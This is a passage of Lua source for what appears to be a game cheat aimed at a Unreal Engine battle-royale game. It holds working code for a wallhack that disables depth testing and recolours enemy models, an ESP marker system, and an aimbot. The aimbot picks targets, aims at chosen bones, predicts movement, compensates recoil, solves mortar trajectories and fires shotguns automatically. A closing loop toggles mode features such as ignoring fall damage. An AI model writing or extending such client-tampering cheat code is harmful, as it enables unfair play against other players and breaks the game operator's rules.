                cfg[1003].BindSocketName = "head"; 
                cfg[1003].bUseLuaWorldSocketName = true
            end 
            cfg[9999] = { 
                UIPathName = "/Game/Mod/EvoBase/BluePrints/UIBP/QuickSign/QuickSign_TipHitEnemy_UIBP_New.QuickSign_TipHitEnemy_UIBP_New_C",
                MaxWidgetNum = 99, 
                MaxShowDistance = 6000000, 
                bBindOutScreen = true,
                bBindBlocked = true, 
                bIsBindingActor = true, 
                BindSocketName = "head",
                bUseLuaWorldSocketName = true, 
                WorldPositionOffset = FVector(0, 0, 130),
                bNeedPreLoad = true, 
                Priority = 2 
            } 
        end 
        ApplyCfg(currentMarkCfg) 
        for k, cfg in pairs(package.loaded) do 
            if type(k) == "string" and string.find(k, "ScreenMarkConfig") and type(cfg) == "table" then 
                ApplyCfg(cfg) 
            end 
        end 
    end)
    _G.LexusState.NativeESPReady = true 
    Notify("Native ESP System Initialized") 
end

-- ========================================== 
-- CORE FUNCTIONS
-- ========================================== 
local function GetAllSkeletalMeshes(enemy, markData)
    local curTime = os.clock()
    if markData and markData.CachedMeshes and markData.CachedMeshTime and (curTime - markData.CachedMeshTime < 3.0) then
        local validMeshes = {}
        for _, cachedMesh in ipairs(markData.CachedMeshes) do
            if Valid(cachedMesh) then table.insert(validMeshes, cachedMesh) end
        end
        markData.CachedMeshes = validMeshes
        return validMeshes
    end

    local meshes = {}
    if Valid(enemy.Mesh) then table.insert(meshes, enemy.Mesh) end
    pcall(function()
        local SkeletalMeshClass = import("SkeletalMeshComponent")
        if SkeletalMeshClass and type(enemy.GetComponentsByClass) == "function" then
            local childs = enemy:GetComponentsByClass(SkeletalMeshClass)
            if childs then
                local count = type(childs.Num) == "function" and childs:Num() or #childs
                for i = 1, count do
                    local comp = type(childs.Get) == "function" and childs:Get(i-1) or childs[i]
                    if Valid(comp) and comp ~= enemy.Mesh then
                        table.insert(meshes, comp)
                    end
                end
            end
        end
    end)
    if markData then
        markData.CachedMeshes = meshes
        markData.CachedMeshTime = curTime
    end
    return meshes
end

-- ========================================== 
-- HÀM XUYÊN TƯỜNG & RESTORE GỐC
-- ==========================================
local function UndoWallXuyenTuong(enemy, markData)
    pcall(function()
        if markData.WallhackApplied then
            local meshes = GetAllSkeletalMeshes(enemy, markData)
            for _, mesh in ipairs(meshes) do
                if Valid(mesh) then
                    pcall(function() if type(mesh.SetRenderCustomDepth) == "function" then mesh:SetRenderCustomDepth(false) end end)
                    for i = 0, 10 do 
                        local matInterface = mesh:GetMaterial(i)
                        if Valid(matInterface) then
                            local baseMat = matInterface:GetBaseMaterial()
                            if Valid(baseMat) then baseMat.bDisableDepthTest = false end
                        end
                    end
                end
            end
            markData.WallhackApplied = false
        end
    end)
end

local function ApplyWallXuyenTuong(enemy, markData)
    pcall(function()
        local meshes = GetAllSkeletalMeshes(enemy, markData)
        for _, mesh in ipairs(meshes) do
            if Valid(mesh) then 
                pcall(function()
                    if type(mesh.SetRenderCustomDepth) == "function" then
                        mesh:SetRenderCustomDepth(true)
                    end
                    if type(mesh.SetCustomDepthStencilValue) == "function" then
                        mesh:SetCustomDepthStencilValue(252) 
                    end
                end)
                for i = 0, 10 do 
                    local matInterface = mesh:GetMaterial(i)
                    if not Valid(matInterface) then break end
                    local baseMat = matInterface:GetBaseMaterial()
                    if Valid(baseMat) then
                        baseMat.bDisableDepthTest = true
                        baseMat.BlendMode = 2 
                    end
                end
            end
        end
    end)
end

local function ApplyColorBodyV2(enemy, pc, markData)
    pcall(function()
        local meshes = GetAllSkeletalMeshes(enemy, markData)
        if #meshes == 0 then return end
        
        local hidden = true
        pcall(function()
            if Valid(pc) and type(pc.LineOfSightTo) == "function" then
                if pc:LineOfSightTo(enemy) then hidden = false else hidden = true end
            end
        end)
        
        local cData = _G.LexusState.CustomTextData or {}
        local hiddenColor = {R = cData.HiddenR or 150, G = cData.HiddenG or 0, B = cData.HiddenB or 0, A = cData.HiddenA or 25}
        local visibleColor = {R = cData.VisibleR or 0, G = cData.VisibleG or 150, B = cData.VisibleB or 0, A = cData.VisibleA or 25}
        
        local finalColor = hidden and hiddenColor or visibleColor
        local colorHash = string.format("%d_%d_%d_%d", finalColor.R, finalColor.G, finalColor.B, finalColor.A)
        local currentMeshCount = #meshes
        local isMeshChanged = (markData.LastMeshCount ~= currentMeshCount)
        
        if not isMeshChanged and markData.LastHiddenState == hidden and markData.LastColorHash == colorHash then return end
        
        markData.LastHiddenState = hidden
        markData.LastMeshCount = currentMeshCount
        markData.LastColorHash = colorHash
        markData.ColorApplied = true
        
        for _, mesh in ipairs(meshes) do
            if Valid(mesh) then
                pcall(function()
                    mesh.LDMaxDrawDistance = -99999
                    mesh.MaxDrawDistanceOffset = -99999
                    mesh.CachedMaxDrawDistance = -99999
                    mesh.UseScopeDistanceCulling = true
                    mesh.PrimitiveShadingStrategy = 1
                    mesh.ShadingRate = 6
                end)
                for i = 0, 10 do
                    local matInterface = mesh:GetMaterial(i)
                    if not Valid(matInterface) then break end
                    local baseMat = matInterface:GetBaseMaterial()
                    if Valid(baseMat) then
                        local matName = tostring(baseMat)
                        if string.find(matName, "Master_Mask", 1, true) then
                            if not markData.MIDs then markData.MIDs = {} end
                            local meshStr = tostring(mesh)
                            if not markData.MIDs[meshStr] then markData.MIDs[meshStr] = {} end
                            local mid = markData.MIDs[meshStr][i]
                            if not Valid(mid) then
                                mid = mesh:CreateAndSetMaterialInstanceDynamic(i)
                                markData.MIDs[meshStr][i] = mid
                            end
                            if Valid(mid) then
                                mid:SetVectorParameterValue("颜色", finalColor)
                                mid:SetVectorParameterValue("Extra Light Color", finalColor)
                                mid:SetVectorParameterValue("Para_Color", finalColor)
                                mid:SetVectorParameterValue("Para_ColorTint", finalColor)
                                mid:SetVectorParameterValue("Para_Color_1", finalColor)
                                mid:SetVectorParameterValue("Tint", finalColor)
                                mid:SetVectorParameterValue("Color", finalColor)
                                mid:SetVectorParameterValue("BaseColor", finalColor)
                                mid:SetVectorParameterValue("BodyColor", finalColor)
                                mid:SetVectorParameterValue("MainColor", finalColor)
                                mid:SetVectorParameterValue("DiffuseColor", finalColor)
                                mid:SetVectorParameterValue("EmissiveColor", finalColor)
                                mid:SetVectorParameterValue("ParaScaleOffset", SCALE_COLOR_V2)
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function UndoColorBodyV2(enemy, markData)
    pcall(function()
        if markData.ColorApplied then
            local meshes = GetAllSkeletalMeshes(enemy, markData)
            for _, mesh in ipairs(meshes) do
                if Valid(mesh) then
                    pcall(function()
                        mesh.PrimitiveShadingStrategy = 0
                        mesh.ShadingRate = 1
                    end)
                    if markData.MIDs and markData.MIDs[tostring(mesh)] then
                        for i, mid in pairs(markData.MIDs[tostring(mesh)]) do
                            if Valid(mid) then
                                local defC = {R=1, G=1, B=1, A=1}
                                mid:SetVectorParameterValue("颜色", defC)
                                mid:SetVectorParameterValue("Extra Light Color", defC)
                                mid:SetVectorParameterValue("Para_Color", defC)
                                mid:SetVectorParameterValue("Para_ColorTint", defC)
                                mid:SetVectorParameterValue("Para_Color_1", defC)
                                mid:SetVectorParameterValue("Tint", defC)
                                mid:SetVectorParameterValue("Color", defC)
                                mid:SetVectorParameterValue("BaseColor", defC)
                                mid:SetVectorParameterValue("BodyColor", defC)
                                mid:SetVectorParameterValue("MainColor", defC)
                                mid:SetVectorParameterValue("DiffuseColor", defC)
                                mid:SetVectorParameterValue("EmissiveColor", defC)
                            end
                        end
                    end
                end
            end
            markData.ColorApplied = false
            markData.LastColorHash = ""
        end
    end)
end

-- ========================================== 
-- ==========================================
-- HỆ THỐNG AIMBOT V2 (AIM TOUCH — FULL)
-- ==========================================
_G.GetEnemyTargetsFromActors = function(radius)
    local result = {}
    local player = GameplayData.GetPlayerCharacter()
    if not slua.isValid(player) then
        return result
    end

    local allCharacters = {}
    pcall(function()
        if GameplayData.GetAllPlayerCharacters then
            allCharacters = GameplayData.GetAllPlayerCharacters() or {}
        elseif GameplayData.GameCharacters then
            for _, char in pairs(GameplayData.GameCharacters) do
                table.insert(allCharacters, char)
            end
        end
    end)

    local myTeam = 0
    pcall(function()
        if type(player.GetTeamID) == "function" then
            myTeam = player:GetTeamID() or 0
        else
            myTeam = player.TeamID or 0
        end
    end)

    for _, actor in pairs(allCharacters) do
        if slua.isValid(actor) and actor ~= player then
            local ok = true
            local tTeam = -1
            pcall(function()
                if type(actor.GetTeamID) == "function" then
                    tTeam = actor:GetTeamID() or -1
                else
                    tTeam = actor.TeamID or -1
                end
            end)
            if tTeam == myTeam then ok = false end

            -- alive check (aman, tidak error kalau IsAlive nil)
            if ok then
                local alive = true
                pcall(function()
                    if type(actor.IsAlive) == "function" then
                        alive = actor:IsAlive()
                    elseif type(actor.IsDead) == "function" then
                        alive = not actor:IsDead()
                    end
                    if actor.HealthStatus == 2 then alive = false end
                    if actor.bIsDead == true then alive = false end
                end)
                if not alive then ok = false end
            end

            if ok then
                local dist = 99999999
                pcall(function() dist = player:GetDistanceTo(actor) end)
                if dist <= radius then
                    table.insert(result, actor)
                end
            end
        end
    end
    return result
end

_G.AimTouch = function()
    pcall(function()
        if not (_G.LexusConfig and _G.LexusConfig.AimTouchEnable) then return end
        _G.LexusState = _G.LexusState or {}
        _G.LexusState.CustomTextData = _G.LexusState.CustomTextData or {}
        local CT = _G.LexusState.CustomTextData
        local cfg = _G.LexusConfig

        local player = GameplayData.GetPlayerCharacter()
        if not slua.isValid(player) then return end

        local pc = player:GetPlayerControllerSafety()
        if not slua.isValid(pc) then return end

        local isFiring = player.bIsWeaponFiring
        local isADS = player.bIsGunADS

        local weapon = player.WeaponManagerComponent and player.WeaponManagerComponent.CurrentWeaponReplicated
        if not weapon and type(player.GetCurrentShootWeapon) == "function" then
            weapon = player:GetCurrentShootWeapon()
        end

        local isShotgun = false
        local isSniper = false
        local isMortar = false
        local currentAmmo = 1

        if slua.isValid(weapon) then
            local wID = 0
            local wName = ""
            pcall(function()
                if type(weapon.GetWeaponID) == "function" then wID = weapon:GetWeaponID() or 0 end
                if type(weapon.GetWeaponName) == "function" then wName = weapon:GetWeaponName() or "" end
            end)
            wName = tostring(wName)

            if (wID >= 104000 and wID < 105000) or (wID >= 1030000 and wID < 1040000)
                or wName:find("S686") or wName:find("S1897") or wName:find("S12")
                or wName:find("DBS") or wName:find("M1014") then
                isShotgun = true
            end

            if wName:find("Kar98") or wName:find("M24") or wName:find("AWM") or wName:find("Mosin")
                or wName:find("Win94") or wName:find("AMR") or wName:find("SKS") or wName:find("SLR")
                or wName:find("Mini") or wName:find("Mk14") or wName:find("QBU") or wName:find("Mk12")
                or wName:find("VSS") then
                isSniper = true
            end

            if wName:lower():find("mortar") then
                isMortar = true
            end

            pcall(function()
                if type(weapon.GetCurrentAmmo) == "function" then
                    currentAmmo = weapon:GetCurrentAmmo()
                elseif weapon.ShootWeaponComponent and type(weapon.ShootWeaponComponent.GetCurrentAmmo) == "function" then
                    currentAmmo = weapon.ShootWeaponComponent:GetCurrentAmmo()
                elseif weapon.CurrentAmmo ~= nil then
                    currentAmmo = weapon.CurrentAmmo
                end
            end)
        end

        -- reset auto-fire flag tiap tick (shotgun autofire)
        if _G.LexusState.IsAutoFiring then
            pcall(function()
                player.bIsWeaponFiring = false
                if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(false) end
                if type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(false) end
                local wepMgr = player.WeaponManagerComponent
                if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = false end
            end)
            _G.LexusState.IsAutoFiring = false
        end

        if isShotgun and currentAmmo and currentAmmo <= 0 then
            return
        end

        local cond = 2
        local prioMode = 1
        local boneIdx = 1
        local speedVal = 50
        local fovVal = 30
        local maxDistMeters = 50
        local useVisCheck = false
        local igKnock = false
        local igBot = false
        local predVal = 0
        local recoilCompVal = 0

        if isMortar and cfg.AimTouchMortar then
            local isPlaced = false
            pcall(function()
                if weapon and weapon.MortarState == 2 then isPlaced = true end
            end)
            if not isPlaced then return end
            cond = 2
            prioMode = 1
            boneIdx = 4
            speedVal = 100
            fovVal = CT.AimTouchMortarFOV or 360
            maxDistMeters = 2000
            useVisCheck = false
            igKnock = false
            igBot = false
            predVal = CT.AimTouchMortarPred or 0

        elseif isShotgun and cfg.AimTouchSG then
            cond = CT.AimTouchSGCond or 1
            if cfg.AimTouchSGAutoFire then cond = 2 end
            if cond == 1 and not isFiring then return end
            prioMode = CT.AimTouchSGPrio or 1
            boneIdx = CT.AimTouchSGBone or 2
            speedVal = CT.AimTouchSGSpeed or 80
            fovVal = CT.AimTouchSGFOV or 40
            maxDistMeters = CT.AimTouchSGDist or 30
            useVisCheck = cfg.AimTouchSGVisCheck
            igKnock = cfg.AimTouchSGIgKnock
            igBot = cfg.AimTouchSGIgBot

        elseif isADS then
            if isSniper and cfg.AimTouchScopeSniper then
                cond = CT.AimTouchSniperCond or 2
                if cond == 1 and not isFiring then return end
                prioMode = CT.AimTouchSniperPrio or 1
                boneIdx = CT.AimTouchSniperBone or 1
                speedVal = CT.AimTouchSniperSpeed or 30
                fovVal = CT.AimTouchSniperFOV or 20
                maxDistMeters = CT.AimTouchSniperDist or 400
                useVisCheck = cfg.AimTouchSniperVisCheck
                igKnock = cfg.AimTouchSniperIgKnock
                igBot = cfg.AimTouchSniperIgBot
                predVal = CT.AimTouchSniperPred or 0
            elseif cfg.AimTouchScopeAll then
                cond = CT.AimTouchScopeCond or 1
                if cond == 1 and not isFiring then return end
                prioMode = CT.AimTouchScopePrio or 1
                boneIdx = CT.AimTouchScopeBone or 2
                speedVal = CT.AimTouchScopeSpeed or 40
                fovVal = CT.AimTouchScopeFOV or 20
                maxDistMeters = CT.AimTouchScopeDist or 300
                useVisCheck = cfg.AimTouchScopeVisCheck
                igKnock = cfg.AimTouchScopeIgKnock
                igBot = cfg.AimTouchScopeIgBot
                predVal = CT.AimTouchScopePred or 0
                recoilCompVal = CT.AimTouchScopeRecoil or 0
            else
                return
            end
        else
            if not cfg.AimTouchHipfire then return end
            cond = CT.AimTouchHipCond or 1
            if cond == 1 and not isFiring then return end
            prioMode = CT.AimTouchHipPrio or 1
            boneIdx = CT.AimTouchHipBone or 1
            speedVal = CT.AimTouchHipSpeed or 50
            fovVal = CT.AimTouchHipFOV or 30
            maxDistMeters = CT.AimTouchHipDist or 250
            useVisCheck = cfg.AimTouchHipVisCheck
            igKnock = cfg.AimTouchHipIgKnock
            igBot = cfg.AimTouchHipIgBot
        end

        local currentMaxDist = maxDistMeters * 100
        local enemies = _G.GetEnemyTargetsFromActors(currentMaxDist)
        if not enemies or #enemies == 0 then return end

        local FVector2D = import("Vector2D")
        local UGameplayStatics = import("GameplayStatics")
        local KismetMathLibrary = import("KismetMathLibrary")

        local camManager = UGameplayStatics.GetPlayerCameraManager(pc, 0)
        if not slua.isValid(camManager) then return end
        local camLoc = camManager:GetCameraLocation()
        if not camLoc then return end

        local ui_util = require("client.common.ui_util")
        if not ui_util or not ui_util.GetViewportSize then return end
        local viewportSize = ui_util.GetViewportSize()
        if not viewportSize then return end

        local centerX = viewportSize.X * 0.5
        local centerY = viewportSize.Y * 0.5
        local FOV_RADIUS = (fovVal / 100.0) * (viewportSize.X / 2.0)

        local bestTarget = nil
        local bestScore = 99999999

        local selBoneName = "head"
        if boneIdx == 1 then selBoneName = "head"
        elseif boneIdx == 2 then selBoneName = "spine_03"
        elseif boneIdx == 3 then selBoneName = "spine_01"
        elseif boneIdx == 4 then selBoneName = "pelvis" end

        for _, target in ipairs(enemies) do
            if not slua.isValid(target) then goto at_continue end

            pcall(function()
                if slua.isValid(target.Mesh) then
                    target.Mesh.MeshComponentUpdateFlag = 0
                end
            end)

            if igKnock then
                local knock = false
                pcall(function()
                    if target.HealthStatus == 1 then knock = true end
                    if type(target.IsNearDeath) == "function" and target:IsNearDeath() then knock = true end
                end)
                if knock then goto at_continue end
            end

            if igBot then
                local tIsBot = false
                pcall(function()
                    if target.bIsAI == true or target.IsAI == true then tIsBot = true end
                    local pState = target.PlayerState
                    if slua.isValid(pState) and (pState.bIsABot or pState.bIsBot) then tIsBot = true end
                end)
                if tIsBot then goto at_continue end
            end

            if useVisCheck then
                local curTime = os.clock()
                local tId = tostring(target)
                pcall(function()
                    if type(target.GetUniqueID) == "function" then tId = tostring(target:GetUniqueID()) end
                end)
                _G.AimTouchVisCache = _G.AimTouchVisCache or {}
                if not _G.AimTouchVisCache[tId] or (curTime - _G.AimTouchVisCache[tId].time) > 0.2 then
                    local isHidden = true
                    pcall(function()
                        if pc:LineOfSightTo(target) then isHidden = false end
                    end)
                    _G.AimTouchVisCache[tId] = { hidden = isHidden, time = curTime }
                end
                if _G.AimTouchVisCache[tId].hidden then goto at_continue end
            end

            local tPos = nil
            pcall(function() tPos = target:GetBonePos(selBoneName, {X=0, Y=0, Z=0}) end)
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
                pcall(function()
                    if type(target.GetSocketLocation) == "function" then
                        tPos = target:GetSocketLocation(selBoneName)
                    end
                end)
            end
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
                pcall(function()
                    tPos = target:K2_GetActorLocation()
                    if tPos then
                        if boneIdx == 1 then tPos.Z = tPos.Z + 70
                        elseif boneIdx == 2 then tPos.Z = tPos.Z + 40
                        elseif boneIdx == 3 then tPos.Z = tPos.Z + 20 end
                    end
                end)
            end
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then goto at_continue end

            local screen = FVector2D()
            local success = false
            pcall(function()
                success = pc:ProjectWorldLocationToScreen(tPos, screen, false)
            end)
            if not success or not screen or screen.X <= 0 or screen.Y <= 0 then goto at_continue end

            local dx = screen.X - centerX
            local dy = screen.Y - centerY
            local distScreen = math.sqrt(dx * dx + dy * dy)
            if distScreen > FOV_RADIUS then goto at_continue end

            local currentScore = distScreen
            if prioMode == 2 then
                pcall(function() currentScore = player:GetDistanceTo(target) end)
            elseif prioMode == 3 then
                currentScore = target.Health or 100
            elseif prioMode == 4 then
                local hp = target.Health or 100
                local maxhp = target.HealthMax or 100
                if maxhp <= 0 then maxhp = 100 end
                currentScore = hp / maxhp
            end

            if currentScore < bestScore then
                bestScore = currentScore
                bestTarget = target
            end
            ::at_continue::
        end

        if not slua.isValid(bestTarget) then return end

        local finalBonePos = nil
        pcall(function() finalBonePos = bestTarget:GetBonePos(selBoneName, {X=0, Y=0, Z=0}) end)
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
            pcall(function()
                if type(bestTarget.GetSocketLocation) == "function" then
                    finalBonePos = bestTarget:GetSocketLocation(selBoneName)
                end
            end)
        end
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
            pcall(function()
                finalBonePos = bestTarget:K2_GetActorLocation()
                if finalBonePos then
                    if boneIdx == 1 then finalBonePos.Z = finalBonePos.Z + 70
                    elseif boneIdx == 2 then finalBonePos.Z = finalBonePos.Z + 40
                    elseif boneIdx == 3 then finalBonePos.Z = finalBonePos.Z + 20 end
                end
            end)
        end
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then return end

        local tVelocity = nil
        pcall(function()
            if type(bestTarget.GetVelocity) == "function" then
                tVelocity = bestTarget:GetVelocity()
            end
        end)

        if predVal and predVal > 0 and tVelocity then
            pcall(function()
                if tVelocity.X ~= 0 or tVelocity.Y ~= 0 then
                    local distToEnemy = player:GetDistanceTo(bestTarget) / 100.0
                    local ToF
                    if isMortar then
                        ToF = (distToEnemy / 100.0) * (predVal / 50.0)
                    else
                        ToF = (distToEnemy / 800.0) * (predVal / 50.0)
                    end
                    finalBonePos.X = finalBonePos.X + (tVelocity.X * ToF)
                    finalBonePos.Y = finalBonePos.Y + (tVelocity.Y * ToF)
                end
            end)
        end

        local rot = KismetMathLibrary.FindLookAtRotation(camLoc, finalBonePos)
        if not rot then return end

        local currentRot = pc:GetControlRotation()
        if not currentRot then return end

        local deltaYaw = rot.Yaw - currentRot.Yaw
        local deltaPitch = rot.Pitch - currentRot.Pitch

        -- kompensasi selisih camera vs control saat ADS
        if isADS then
            pcall(function()
                if type(camManager.GetCameraRotation) == "function" then
                    local camRot = camManager:GetCameraRotation()
                    if camRot then
                        deltaYaw = deltaYaw - (camRot.Yaw - currentRot.Yaw)
                        deltaPitch = deltaPitch - (camRot.Pitch - currentRot.Pitch)
                    end
                end
            end)
        end

        if deltaYaw > 180 then deltaYaw = deltaYaw - 360 end
        if deltaYaw < -180 then deltaYaw = deltaYaw + 360 end
        if deltaPitch > 180 then deltaPitch = deltaPitch - 360 end
        if deltaPitch < -180 then deltaPitch = deltaPitch + 360 end

        local smoothFactor = 0.0
        if speedVal >= 100 then
            smoothFactor = 1.0
        else
            smoothFactor = (speedVal / 100.0) * 0.3
            if smoothFactor < 0.01 then smoothFactor = 0.01 end
        end

        local finalPitch = currentRot.Pitch + (deltaPitch * smoothFactor)
        local finalYaw = currentRot.Yaw + (deltaYaw * smoothFactor)

        if recoilCompVal and recoilCompVal > 0 and isFiring then
            local pullDownForce = (recoilCompVal / 50.0) * 1.5
            finalPitch = finalPitch - pullDownForce
        end

        -- Mortar trajectory (opsional)
        if isMortar and cfg.AimTouchMortar then
            local targetPos = { X = finalBonePos.X, Y = finalBonePos.Y, Z = finalBonePos.Z }
            local launchPos = { X = camLoc.X, Y = camLoc.Y, Z = camLoc.Z }
            pcall(function()
                local pLoc = player:K2_GetActorLocation()
                if pLoc then
                    launchPos = { X = pLoc.X, Y = pLoc.Y, Z = pLoc.Z + 50 }
                end
            end)

            local function CalcMortarTrajectory(V, G, tX, tY, tZ)
                local mDx = math.sqrt((tX - launchPos.X)^2 + (tY - launchPos.Y)^2) - 80
                if mDx < 500 then mDx = 500 end
                local mDy = tZ - launchPos.Z
                local minVSq = G * (mDy + math.sqrt(mDx * mDx + mDy * mDy))
                if (V * V) < minVSq then
                    V = math.sqrt(minVSq) + 100
                end
                local v2 = V * V
                local root = v2 * v2 - G * (G * mDx * mDx + 2 * mDy * v2)
                if root >= 0 then
                    local angleRad = math.atan((v2 + math.sqrt(root)) / (G * mDx))
                    local deg = math.deg(angleRad)
                    if deg >= 35 and deg <= 89.5 then
                        return true, deg, mDx / (V * math.cos(angleRad)), mDx
                    end
                end
                return false, 45, 0, mDx
            end

            local vNear, gNear = 9070, 980 * 2.8
            local vFar, gFar = 12520, 980 * 4.0
            local vUltra, gUltra = 16800, 980 * 4.5
            local isValid, physAngle, ToF, finalDx = false, 45, 0, 0
            local okNear, angNear, tofNear, dxN = CalcMortarTrajectory(vNear, gNear, targetPos.X, targetPos.Y, targetPos.Z)
            local okFar, angFar, tofFar, dxF = CalcMortarTrajectory(vFar, gFar, targetPos.X, targetPos.Y, targetPos.Z)
            local okUltra, angUltra, tofUltra, dxU = CalcMortarTrajectory(vUltra, gUltra, targetPos.X, targetPos.Y, targetPos.Z)

            if okNear and dxN <= 25000 then
                isValid, physAngle, ToF, finalDx = okNear, angNear, tofNear, dxN
            elseif okFar and dxF <= 40000 then
                isValid, physAngle, ToF, finalDx = okFar, angFar, tofFar, dxF
            elseif okUltra then
                isValid, physAngle, ToF, finalDx = okUltra, angUltra, tofUltra, dxU
            elseif okNear then
                isValid, physAngle, ToF, finalDx = okNear, angNear, tofNear, dxN
            end

            local targetCameraPitch = ((physAngle - 45) / 43.0) * 90.0 - 60.0
            local targetCameraYaw = rot.Yaw
            local deltaPitchMortar = targetCameraPitch - currentRot.Pitch
            local deltaYawMortar = targetCameraYaw - currentRot.Yaw
            if deltaPitchMortar > 180 then deltaPitchMortar = deltaPitchMortar - 360 end
            if deltaPitchMortar < -180 then deltaPitchMortar = deltaPitchMortar + 360 end
            if deltaYawMortar > 180 then deltaYawMortar = deltaYawMortar - 360 end
            if deltaYawMortar < -180 then deltaYawMortar = deltaYawMortar + 360 end
            finalPitch = currentRot.Pitch + (deltaPitchMortar * smoothFactor)
            finalYaw = currentRot.Yaw + (deltaYawMortar * smoothFactor)
        end

        -- SetControlRotation: coba 1 arg, fallback 2 arg
        pcall(function()
            local finalRot = FRotator(finalPitch, finalYaw, 0)
            local ok = pcall(function() pc:SetControlRotation(finalRot) end)
            if not ok then
                pcall(function() pc:SetControlRotation(finalRot, "AimTouch") end)
            end
        end)
        -- fallback table form
        pcall(function()
            pc:SetControlRotation({ Pitch = finalPitch, Yaw = finalYaw, Roll = 0 })
        end)

        if isShotgun and cfg.AimTouchSGAutoFire then
            pcall(function()
                local distToTarget = player:GetDistanceTo(bestTarget) / 100
                if distToTarget <= maxDistMeters then
                    player.bIsWeaponFiring = true
                    if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(true) end
                    if type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(true) end
                    local wepMgr = player.WeaponManagerComponent
                    if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = true end
                    local currentWep = player:GetCurrentWeapon()
                    if slua.isValid(currentWep) and type(currentWep.StartFire) == "function" then
                        currentWep:StartFire()
                    end
                    _G.LexusState.IsAutoFiring = true
                end
            end)
        end
    end)
end

-- ========================================== 
-- LOST TOMB FEATURES LOOP
-- ========================================== 
local function LostTombFeaturesLoop()

    -- PUT Skin: apply in match (throttled ~1.5s)
    pcall(function()
        if not (_G.LexusConfig and _G.LexusConfig.ModSkin and _G.AddOutfit) then return end
        local AO = _G.AddOutfit
        if not (AO.isInRealMatch and AO.isInRealMatch()) then return end
        _G.AddOutfitLobbyRestored = false
        local now = os.clock()
        _G._PUT_LastMatchSkinApply = _G._PUT_LastMatchSkinApply or 0
        if (now - _G._PUT_LastMatchSkinApply) < 8.0 then return end
        local lp = nil
        pcall(function()
            local GD = package.loaded["GameLua.GameCore.Data.GameplayData"] or require("GameLua.GameCore.Data.GameplayData")
            if GD and GD.GetPlayerCharacter then lp = GD.GetPlayerCharacter() end
        end)
        if not lp or not slua.isValid(lp) then return end
        _G._PUT_LastMatchSkinApply = now
        if AO.matchApplyAllSlots then AO.matchApplyAllSlots(lp) end
        if AO.matchApplyHat then AO.matchApplyHat(lp) end
        if AO.matchApplyWeaponSkin then AO.matchApplyWeaponSkin(lp) end
        if AO.isCharacterAirborne and AO.applyAirborneSlots and AO.isCharacterAirborne(lp) then
            AO.applyAirborneSlots(lp, true)
        end
    end)

    pcall(function()
        local localPlayer = GameplayData.GetPlayerCharacter()
        if not Valid(localPlayer) then return end
        
        -- Ignore Falling Damage
        if _G.LexusConfig.IgnoreFallingDamage then
            _G.LostTomb_MarkIgnoreFallingDamage("ModFeature", false, 999999)
        end
        
        -- Show Head HP Bar
        if _G.LexusConfig.ShowHeadHPBar then
            _G.LostTomb_ShowHeadHPBar()
        end
        
        -- Custom Gender
        if _G.LexusConfig.EnableCustomGender then
            local gender = _G.LostTomb_GetCustomGender()
            if gender then
                localPlayer.LTAvatarGender = gender
                if type(localPlayer.OnRep_LTAvatarGender) == "function" then
                    localPlayer:OnRep_LTAvatarGender()
                end
            end
        end
        
        -- Loading Avatar
        if _G.LexusConfig.EnableLoadingAvatar then
            if not _G.LexusState.IsCloseCharacterOverrideAvatar then
                _G.LostTomb_SetCloseCharacterOverrideAvatar(true)
            end
        elseif _G.LexusState.IsCloseCharacterOverrideAvatar then
            _G.LostTomb_SetCloseCharacterOverrideAvatar(false)
        end
        
        -- Damage Analysis
        if _G.LexusConfig.EnableDamageAnalysis then
            if not _G.LexusState.DamageAnalysisEnabled then
                localPlayer.bEnableDamageAnalysis = true
                _G.LexusState.DamageAnalysisEnabled = true
            end
        else
            if _G.LexusState.DamageAnalysisEnabled then
                localPlayer.bEnableDamageAnalysis = false
                _G.LexusState.DamageAnalysisEnabled = false
            end
        end
        
        -- Skill Flow Report
        if _G.LexusConfig.EnableSkillFlowReport then
            if not _G.LexusState.SkillFlowEnabled then
                localPlayer.CachedSkillFlow = {}
                _G.LexusState.SkillFlowEnabled = true
            end
        else
            if _G.LexusState.SkillFlowEnabled then
                localPlayer.CachedSkillFlow = {}
                _G.LexusState.SkillFlowEnabled = false
            end
        end
        
        -- Supply Box Evolution
        if _G.LexusConfig.EnableSupplyBoxEvolution then
            local evolutionParam = {
                bIsValid = true,
                BoxType = 1,
                EvolutionLevel = 1
            }
            _G.LostTomb_ShowSupplyBoxEvolution(evolutionParam)
        end
        
        -- Max Walk Speed Curve
        if _G.LexusConfig.EnableMaxWalkSpeedCurve then
            if not _G.LexusState.MaxWalkSpeedCurveApplied then
                local curve = LoadObject("CurveFloat'/Game/Mod/LostTombCommon/Blueprints/Core/Curves/LT_DefaultMaxWalkSpeedCurve.LT_DefaultMaxWalkSpeedCurve'")
                if curve then
                    _G.LostTomb_AddMaxWalkSpeedCurve(curve)
                    _G.LexusState.MaxWalkSpeedCurveApplied = true
                end
            end
        else
            if _G.LexusState.MaxWalkSpeedCurveApplied then
                local curve = LoadObject("CurveFloat'/Game/Mod/LostTombCommon/Blueprints/Core/Curves/LT_DefaultMaxWalkSpeedCurve.LT_DefaultMaxWalkSpeedCurve'")
                if curve then
                    _G.LostTomb_RemoveMaxWalkSpeedCurve(curve)
                    _G.LexusState.MaxWalkSpeedCurveApplied = false
                end
            end
        end
        
        -- Steal Life Effect
        if _G.LexusConfig.EnableStealLifeEffect then
            if _G.LexusState.StealLifeCount > 0 then
                _G.LostTomb_UpdateStealLifeCount(0)
            end
        end
        
        -- Behind Attack Bonus
        if _G.LexusConfig.BehindAttackBonus then
            if not _G.LexusState.BehindAttackEnabled then
                localPlayer.BehindAttackEnabled = true
                _G.LexusState.BehindAttackEnabled = true
            end
        else
